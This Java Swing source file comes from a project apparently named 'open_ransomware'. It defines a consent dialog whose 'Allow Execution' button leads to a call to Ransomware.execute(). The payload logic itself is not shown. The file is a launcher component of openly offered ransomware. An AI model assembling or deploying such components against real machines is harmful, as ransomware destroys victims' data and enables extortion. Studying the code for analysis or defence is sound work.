package com.bechris100.open_ransomware.windows;

import com.bechris100.open_ransomware.ResourceManager;
import com.bechris100.open_ransomware.SoftwareEnvironment;
import com.bechris100.open_ransomware.software.Ransomware;

import javax.swing.*;
import java.awt.*;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;

/*
Fully working Window
 */
public class UserPromptWindow {

    private static final int WIDTH = 500, HEIGHT = 300;

    private static boolean EXECUTING_TASK = false;

    public UserPromptWindow() {
        JFrame frame = new JFrame();
        frame.setLayout(null);
        frame.setSize(WIDTH, HEIGHT);
        frame.setTitle(SoftwareEnvironment.UserPrompt.title);
        frame.setResizable(false);
        frame.setLocationRelativeTo(null);
        frame.getContentPane().setBackground(Color.decode("#1d2021"));
        frame.setIconImage(Toolkit.getDefaultToolkit().createImage(ResourceManager.getPath("res/tray_icon.png")));
        frame.addWindowListener(new WindowListener() {
            @Override
            public void windowOpened(WindowEvent windowEvent) {
            }

            @Override
            public void windowClosing(WindowEvent windowEvent) {
                if (EXECUTING_TASK)
                    Ransomware.execute();
                else
                    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            }

            @Override
            public void windowClosed(WindowEvent windowEvent) {
            }

            @Override
            public void windowIconified(WindowEvent windowEvent) {
            }

            @Override
            public void windowDeiconified(WindowEvent windowEvent) {
            }

            @Override
            public void windowActivated(WindowEvent windowEvent) {
            }

            @Override
            public void windowDeactivated(WindowEvent windowEvent) {
            }
        });

        JLabel jMessage = new JLabel(SoftwareEnvironment.UserPrompt.message);
        jMessage.setBounds(0, 0, 500, 240);
        jMessage.setForeground(Color.WHITE);
        jMessage.setFont(new Font(jMessage.getFont().getName(), jMessage.getFont().getStyle(), 16));
        frame.add(jMessage);

        JButton jPositive = new JButton("Allow Execution");
        jPositive.setBounds(0, HEIGHT - 57, WIDTH / 2, 25);
        jPositive.setFont(new Font(jPositive.getFont().getName(), jPositive.getFont().getStyle(), 16));
        jPositive.setForeground(Color.WHITE);
        jPositive.setBackground(Color.decode("#191919"));
        jPositive.addActionListener(actionEvent -> {
            EXECUTING_TASK = true;
            frame.dispatchEvent(new WindowEvent(frame, WindowEvent.WINDOW_CLOSING));
        });
        frame.add(jPositive);

        JButton jNegative = new JButton("Disallow Execution");
        jNegative.setBounds(WIDTH / 2, HEIGHT - 57, WIDTH / 2, 25);
        jNegative.setFont(new Font(jNegative.getFont().getName(), jPositive.getFont().getStyle(), 16));
        jNegative.setForeground(Color.WHITE);
        jNegative.setBackground(Color.decode("#191919"));
        jNegative.addActionListener(actionEvent -> System.exit(0));
        frame.add(jNegative);

        frame.setVisible(true);
    }

}
